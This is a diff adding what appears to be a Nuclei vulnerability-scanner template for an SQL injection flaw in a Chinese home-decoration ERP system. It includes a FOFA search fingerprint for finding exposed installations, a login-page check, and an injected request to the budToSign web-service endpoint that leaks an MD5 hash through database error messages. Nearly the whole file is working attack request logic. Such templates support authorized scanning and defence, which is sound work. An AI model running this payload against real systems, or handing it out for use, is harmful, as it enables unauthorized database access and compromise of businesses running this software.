@@ -1,0 +1,46 @@
+id: poc-yaml-znfit-erp-ms-budtosign-sqli
+info:
+  name: 家装ERP管理系统 budToSign SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  metadata:
+    finger: 家装ERP管理系统
+    fofa: body="上海装盟信息科技有限公司"
+
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+
+flow: http(1) && http(2)
+
+http:
+  - id: "check-system"
+    method: GET
+    path:
+      - "{{BaseURL}}/main/login.aspx"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "上海装盟信息科技有限公司"
+
+  - id: "check-sqli"
+    method: GET
+    path:
+      - "{{BaseURL}}/WEB_SERVICE/Budget.asmx/budToSign?no=sys.fn_varbintohexstr(hashbytes('MD5','{{t1}}'))&bools=string"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        words:
+          - "0x{{t2}}"
+      - type: regex
+        regex:
+          - "转换成数据类型(.*?)时失败"
+          - "在将(.*?)值"
